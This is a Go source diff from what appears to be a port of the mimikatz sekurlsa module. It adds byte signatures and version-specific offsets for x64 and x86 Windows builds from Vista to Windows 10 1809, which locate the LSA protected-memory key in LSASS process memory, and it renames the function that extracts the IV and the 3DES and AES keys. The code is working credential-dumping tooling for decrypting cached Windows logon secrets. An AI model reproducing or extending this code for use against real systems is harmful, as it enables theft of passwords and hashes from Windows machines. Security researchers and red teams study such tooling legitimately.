@@ -13,9 +13,97 @@ import (
 )
 
 var (
-	win10LSAInitializeProtectedMemoryKey = []byte{
+	patternWin7X64LSAInitProtectedMemoryKey = []byte{
+		0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D,
+	}
+	patternWin8X64LSAInitProtectedMemoryKey = []byte{
+		0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D,
+	}
+	patternWin10X64LSAInitProtectedMemoryKey = []byte{
 		0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D, 0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15,
-	} // 67, -89, 16
+	}
+
+	lsaInitProtectedMemoryKeyReferencesX64 = map[uint32]*patchGeneric{
+		buildWinVista: {
+			search: &patchPattern{
+				length: len(patternWin7X64LSAInitProtectedMemoryKey),
+				data:   patternWin7X64LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 63, off1: -69, off2: 25},
+		},
+		buildWin7: {
+			search: &patchPattern{
+				length: len(patternWin7X64LSAInitProtectedMemoryKey),
+				data:   patternWin7X64LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 59, off1: -61, off2: 25},
+		},
+		buildWin8: {
+			search: &patchPattern{
+				length: len(patternWin8X64LSAInitProtectedMemoryKey),
+				data:   patternWin8X64LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 62, off1: -70, off2: 13},
+		},
+		buildWin10v1507: {
+			search: &patchPattern{
+				length: len(patternWin10X64LSAInitProtectedMemoryKey),
+				data:   patternWin10X64LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 61, off1: -73, off2: 16},
+		},
+		buildWin10v1809: {
+			search: &patchPattern{
+				length: len(patternWin10X64LSAInitProtectedMemoryKey),
+				data:   patternWin10X64LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 67, off1: -89, off2: 16},
+		},
+	}
+)
+
+var (
+	patternWinAllX86LSAInitProtectedMemoryKey = []byte{0x6A, 0x02, 0x6A, 0x10, 0x68}
+
+	lsaInitProtectedMemoryKeyReferencesX86 = map[uint32]*patchGeneric{
+		buildWin7: {
+			search: &patchPattern{
+				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
+				data:   patternWinAllX86LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 5, off1: -76, off2: -21},
+		},
+		buildWin8: {
+			search: &patchPattern{
+				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
+				data:   patternWinAllX86LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 5, off1: -69, off2: -18},
+		},
+		buildWinBlue: {
+			search: &patchPattern{
+				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
+				data:   patternWinAllX86LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 5, off1: -79, off2: -22},
+		},
+		buildWin10v1507: {
+			search: &patchPattern{
+				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
+				data:   patternWinAllX86LSAInitProtectedMemoryKey,
+			},
+			patch:   &patchPattern{length: 0, data: nil},
+			offsets: &patchOffsets{off0: 5, off1: -79, off2: -22},
+		},
+	}
 )
 
 type bcryptHandleKey struct {
@@ -48,7 +136,8 @@ type hardKey struct {
 	data     [4]byte // self append
 }
 
-func (kiwi *Kiwi) requireNT6LSAKeys(pHandle windows.Handle) error {
+// acquireNT6LSAKeys is used to get IV and generate 3DES key and AES key.
+func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	kiwi.mu.Lock()
 	defer kiwi.mu.Unlock()
 
@@ -64,7 +153,7 @@ func (kiwi *Kiwi) requireNT6LSAKeys(pHandle windows.Handle) error {
 
 	// address1 += 4 + uintptr(offset64)
 
-	index := bytes.Index(memory, win10LSAInitializeProtectedMemoryKey)
+	index := bytes.Index(memory, patternWin10X64LSAInitProtectedMemoryKey)
 
 	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
 	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
